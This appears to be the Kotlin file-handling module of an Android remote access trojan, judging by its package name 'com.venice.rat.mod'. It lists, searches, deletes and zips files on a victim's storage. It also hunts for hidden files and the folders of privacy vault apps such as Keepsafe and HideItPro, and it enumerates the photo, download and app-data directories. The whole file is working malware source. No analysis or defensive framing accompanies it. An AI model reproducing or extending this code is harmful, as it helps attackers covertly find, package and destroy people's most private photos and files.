package com.venice.rat.mod

import android.annotation.SuppressLint
import android.os.Environment
import com.venice.rat.core.U
import java.io.File
import java.util.zip.ZipEntry
import java.util.zip.ZipInputStream
import java.util.zip.ZipOutputStream

@SuppressLint("SdCardPath")
object Files {

    val VAULT_HINTS = listOf(".GalleryVault", ".vault", ".lock", ".hide", ".nomedia",
        ".MySecretFolder", ".SecureFolder", ".keepsafe", ".HideItPro")

    fun root(): File = U.sd()

    fun ls(f: File): List<File> = (f.listFiles() ?: emptyArray()).sortedWith(
        compareBy({ !it.isDirectory }, { it.name.lowercase() })
    )

    fun del(f: File): Boolean = runCatching { f.deleteRecursively() }.getOrDefault(false)
    fun mk(f: File): Boolean = runCatching { f.mkdirs() }.getOrDefault(false)

    fun search(start: File, q: String, max: Int = 200): List<File> {
        val res = ArrayList<File>()
        val stack = ArrayDeque<File>().apply { add(start) }
        val ql = q.lowercase()
        while (stack.isNotEmpty() && res.size < max) {
            val d = stack.removeFirst()
            val kids = runCatching { d.listFiles() }.getOrNull() ?: continue
            for (k in kids) {
                if (k.name.lowercase().contains(ql)) res.add(k)
                if (k.isDirectory && res.size < max) stack.add(k)
            }
        }
        return res
    }

    fun hidden(max: Int = 300): List<File> {
        val res = ArrayList<File>()
        val stack = ArrayDeque<File>().apply { add(U.sd()) }
        while (stack.isNotEmpty() && res.size < max) {
            val d = stack.removeFirst()
            val kids = runCatching { d.listFiles() }.getOrNull() ?: continue
            for (k in kids) {
                val vault = VAULT_HINTS.any { k.name.contains(it, true) }
                if (k.name.startsWith(".") || vault) res.add(k)
                if (k.isDirectory && d.absolutePath.count { it == '/' } < 4) stack.add(k)
            }
        }
        return res.distinct()
    }

    fun zip(src: File, dst: File): Boolean = runCatching {
        ZipOutputStream(dst.outputStream().buffered()).use { z ->
            src.walkTopDown().forEach { f ->
                val name = f.absolutePath.removePrefix(src.parent ?: "").trimStart('/')
                if (f.isDirectory) {
                    z.putNextEntry(ZipEntry("$name/"))
                    z.closeEntry()
                } else {
                    z.putNextEntry(ZipEntry(name))
                    f.inputStream().use { it.copyTo(z) }
                    z.closeEntry()
                }
            }
        }
        true
    }.getOrDefault(false)

    fun unzip(z: File, dst: File): Int {
        var n = 0
        runCatching {
            ZipInputStream(z.inputStream().buffered()).use { zi ->
                var e = zi.nextEntry
                while (e != null) {
                    val out = File(dst, e.name)
                    if (out.canonicalPath.startsWith(dst.canonicalPath)) {
                        if (e.isDirectory) out.mkdirs() else {
                            out.parentFile?.mkdirs()
                            out.outputStream().use { zi.copyTo(it) }
                            n++
                        }
                    }
                    zi.closeEntry()
                    e = zi.nextEntry
                }
            }
        }
        return n
    }

    fun dirs(): String = buildString {
        listOf(
            Environment.getExternalStorageDirectory(),
            Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS),
            Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM),
            Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES),
            File("/storage/emulated/0/Android/data"),
            File("/storage/emulated/0/Android/media")
        ).filter { it.exists() }.forEach { appendLine(it.absolutePath) }
    }
}
